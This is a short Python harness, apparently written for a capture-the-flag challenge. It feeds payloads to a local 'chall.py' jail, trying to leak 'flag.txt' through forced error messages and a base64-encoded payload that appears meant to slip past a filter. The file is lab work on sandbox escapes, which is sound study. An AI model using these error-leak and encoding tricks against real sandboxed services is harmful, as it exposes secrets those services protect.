#!/usr/bin/env python3
import subprocess
import sys

def test_payload(payload):
    print(f"Testing payload: {payload}")
    try:
        result = subprocess.run(['python', 'chall.py'], 
                              input=payload + '\nexit\n', 
                              text=True, 
                              capture_output=True, 
                              timeout=5)
        print("STDOUT:", result.stdout)
        print("STDERR:", result.stderr)
        return result.stdout
    except subprocess.TimeoutExpired:
        print("Timeout")
        return None

# Test different ways to get output
print("=== Testing different output methods ===")

# Try to cause an error with the flag content
test_payload("x = open('flag.txt').read(); 1/0")

# Try to access the flag content through an error
test_payload("x = open('flag.txt').read(); x[999]")

# Try to use the flag in a way that might cause an error
test_payload("x = open('flag.txt').read(); int(x)")

# Try to use the flag in a way that might cause an error
test_payload("x = open('flag.txt').read(); x.nonexistent_method()")

# Try to use the flag in a way that might cause an error
test_payload("x = open('flag.txt').read(); x[0] = 'a'")

# Try to use the flag in a way that might cause an error
test_payload("x = open('flag.txt').read(); x + 1")

print("\n=== Testing with base64 encoding ===")
import base64
encoded = base64.b64encode("x = open('flag.txt').read(); 1/0".encode()).decode()
test_payload(f"b64:{encoded}")
